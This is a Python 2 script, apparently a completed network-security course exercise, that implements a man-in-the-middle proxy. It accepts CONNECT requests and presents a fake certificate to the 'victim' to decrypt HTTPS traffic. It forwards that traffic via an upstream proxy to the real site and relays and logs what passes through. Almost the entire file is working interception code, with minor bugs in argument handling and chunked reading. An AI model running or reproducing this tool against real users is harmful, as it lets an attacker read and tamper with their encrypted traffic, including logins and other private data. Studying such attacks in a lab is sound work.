from socket import *
import ssl
import threading
import time
import re 
import httplib
import struct
import string
import os
import sys
import socket as Socket
import select

class handler(threading.Thread):
    def __init__(self,socket, port) :
        threading.Thread.__init__(self)
        self.socket=socket
        self.client_port = socket.getpeername()[1]
        self.default_port = port
        # A flag to denote ssl state
        self.sslenable = False

    def initSSLConnection(self, clientSocket):
        # Use your fake certificate to establish connection to victim
        # This function should use
        # 1. send back "HTTP/1.1 200 Connection established\r\n\r\n"
        # 2. use  ssl.wrap_socket to establish ssl-wrap socket connect to victim(use fake certificate )
        # 3. return the ssl-wrap socket
        # ======== Your Code Here!! =======================
        clientSocket.send("HTTP/1.1 200 Connection established\r\n\r\n")
        wsock = ssl.wrap_socket(clientSocket, "myCA.pem", "myCA.pem", server_side=True, ssl_version=ssl.PROTOCOL_TLS)

        return wsock

    def CreateSocketAndConnectToOriginDst(self , host, port):
        # if the port is not 443(http), create socket dirrect connect to the original website
        # if port is 443, create ssl.wrap_socket socket and connect to origin website
        # return the socket or wrap socket
        # ======== Your Code Here!! =======================
        sock = socket()
        if self.sslenable == True:
            sock = ssl.wrap_socket(sock)

        addr = Socket.gethostbyname(host)
        print 'connect to server [{} {} {}] from client [{}]'.format(host, addr, port, self.socket.getpeername()[1])
        sock.connect((addr, port))
        return sock

    def ReadLine(self,SourceSock):
        # This function read a line from socket
        line = ""
        while True:
            char = SourceSock.recv(1)
            line += char
            if not line.find("\r\n") == -1 :
                return line

    def ReadNum(self,SourceSock,length):
        # read data with lenth from SourceSock
        line = ""
        while len(line) < length:
            char = SourceSock.recv(1)
            line += char
        return line

    def ReadHeader(self,SourceSock):
        #This function read the http header from socket
        header = ""
        line = SourceSock.recv(1)

        data = line
        while len(line) :
            line = SourceSock.recv(1)
            data += line
            if not data.find("\r\n\r\n")==-1 :
                header = data
                data = ""
                break;
        dicHeader = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", header))
        #print dicHeader
        #for (k,v) in dicHeader.items():
        #        print k,":",v
        return dicHeader, header

    def ReadHttp(self,SourceSock):
        # Read whole Http packet, and return header and body in string type
        #dicHeader, header = self.ReadHeader(SourceSock)
        res = self.ReadHeader(SourceSock)

        if not res:
            return

        dicHeader = res[0]
        header = res[1]
        if 'User-Agent' in dicHeader:
            self.user_agent = dicHeader['User-Agent']

        body = ""
        if 'Transfer-Encoding' in dicHeader and dicHeader['Transfer-Encoding'] == 'chunked' :
            line = self.ReadLine(SourceSock)
            body += line
            chunkSize = int(line,16)
            print "chunk size is {}".format(chunkSize)
            #while True :

            if chunkSize != 0 :
                line = self.ReadNum(SourceSock,chunkSize+2)
                body += line

        else :
            if 'Content-Length' in dicHeader :
                length = int(dicHeader['Content-Length'])
            else :
                length = 0

            while length>0 :
                line = SourceSock.recv(1)
                length -= len(line)
                body += line

            #self.PrinfContent(body)
        return header,body

    def PrintContent(self,content):
        index = 0
        part = 0x10
        print '[PrintContent]'

        while index < len(content) :
            length = part if len(content)-index >= part else len(content)-index
            print "%08d" % index ,
            for i in range(index,index+length):
                print content[i:i+2].encode('hex').upper(),
                i += 1
            print_str=""
            for i in range(index,index+length):
                if content[i] not in string.printable or content[i] in {'\n','\r','\t'}:
                    print_str+='.'
                else:
                    print_str+=content[i]
            print print_str

            index+=length

    def getHostFromHeader(self, header):
        # Parsing first http packet and find
        # 1) if ssl enable, if header contain "CONNECT 192.168.6.131:443 HTTP/1.1"
        #   then it is https connection, and port and host are return
        # 2) port need to connect
        # 3) host need to conect
        if 'CONNECT' in header:
            self.sslenable = True
        #print "The header is: "+header
        tokens = str(header).split('\r\n')
        tokens = tokens[1].split(' ')
        host = tokens[1]

        if self.sslenable == True:
            port = 443
        else:
            port = 80

        return host,port

    def simpleRead(self, socket):
        return socket.recv(8192)

    def relay(self, rsock, host):
        inputs = [ rsock, self.socket ]
        outputs = []
        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is rsock:
                    raddr = rsock.getsockname()
                    #print '{0} {1} read server'.format(host, raddr[1])
                    #res = self.ReadHttp(s)
                    res = self.simpleRead(s)
                    if res:
                        #self.PrintContent(res)
                        self.socket.sendall(res)
                    else:
                        print 'server [{} {}] close to client [{}]'.format(host, raddr[1], self.client_port)
                        self.socket.close()
                        rsock.close()
                        return
                else:
                    raddr = s.getpeername()
                    #print '{0} {1} read client'.format(host, raddr[1])
                    #res = self.ReadHttp(self.socket)
                    res = self.simpleRead(s)
                    if res:
                        #rsock.send(res[0] + res[1])
                        #self.PrintContent(res)
                        rsock.sendall(res)
                    else:
                        print 'server [{} {}] was closed by client [{}]'.format(host, raddr[1], self.client_port)
                        self.socket.close()
                        rsock.close()
                        return

    def sendConnect(self, host, proxy, proxy_port):
        sock = socket()
        #if self.sslenable == True:
        #    sock = ssl.wrap_socket(sock)
        #addr = Socket.gethostbyname(host)
        print 'connect to proxy [{} {}] from client [{}]'.format(proxy, proxy_port, self.socket.getpeername()[1])
        print 'CONNECT {} HTTP/1.1\r\n'.format(host)
        print 'Host: {}\r\n'.format(host)
        print 'User-Agent: {}\r\n'.format(self.user_agent)
        print 'Connection: keep-alive\r\n'
        print 'Proxy-Connection: keep-alive\r\n\r\n'

        sock.connect((proxy, proxy_port))

        sock.send('CONNECT {} HTTP/1.1\r\n'.format(host))
        sock.send('Host: {}\r\n'.format(host))
        sock.send('User-Agent: {}\r\n'.format(self.user_agent))
        sock.send('Connection: keep-alive\r\n')
        sock.send('Proxy-Connection: keep-alive\r\n\r\n')


    def run(self):
        # The main function for MITM
        # You need to do
        # 1. read http request sent from victim, and use getHostFromHeader to reveal host and port of target website
        # 2. if ssl is enabled, you should use initSSLConnection() to create ssl wrap socket
        # 2.1 if ssl is enabled, you should receive the real request from client by ReadHTTP()
        # 3. create a fakeSocket and connect to website which victim want to connect
        # ==============Your Code Here !! ====================================
        request = self.ReadHttp(self.socket)
        host,port = self.getHostFromHeader(request[0])

        if ("icloud" in host) or ("dropbox" in host) or ("apple" in host):
            return

        # if ("wiki" not in host) and ("neverssl" not in host):
        #     print 'return'
        #     return

        #if "facebook" not in host:
        #    return

        self.sendConnect(host, '192.168.56.2', 3128)


        if self.sslenable == True:
            #try:
                self.socket = self.initSSLConnection(self.socket)
                request = self.ReadHttp(self.socket)
                #host,port = self.getHostFromHeader(request[0])
            #except Exception as ex:
            #    print host
            #    print ex

        print request[0]

        rsock = self.CreateSocketAndConnectToOriginDst(host, int(port))

        # 4. Forward the request sent by user to the fakeSocket
        rsock.sendall(request[0]+request[1])

        print "Client [{}] Request Forwarding Success".format(self.client_port)
        # 5. Read response from fakeSocket and forward to victim's socket
        # 6. close victim's socket and fakeSocket
        response = self.ReadHttp(rsock)
        print "Server [{}] responded to client [{}]".format(host, self.client_port)
        #print "server msg: " + response[0]
        #self.PrintContent(response[1])
        self.socket.sendall(response[0]+response[1])
        print "Server sent"
                
        self.relay(rsock, host)

        # self.socket.close()
        # rsock.close()

        print "Connection Finished"

if not len(sys.argv) == 2 :
    print "This program is Template of Proxy Level MITM Attack"
    print "This program is part of Network Security Project"
    print "Usage: python mitm.py <your address> <port>"
ip = sys.argv[1]
port = int(sys.argv[2])
bindAddress = (ip , port)

serverSocket = socket(AF_INET,SOCK_STREAM)
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
serverSocket.bind(bindAddress)
serverSocket.listen(1)
threads = []
data_dir = "/home/netsec/MITM-master/"

while True :
    clientSocket,addr = serverSocket.accept()
    handler(clientSocket, port).start()


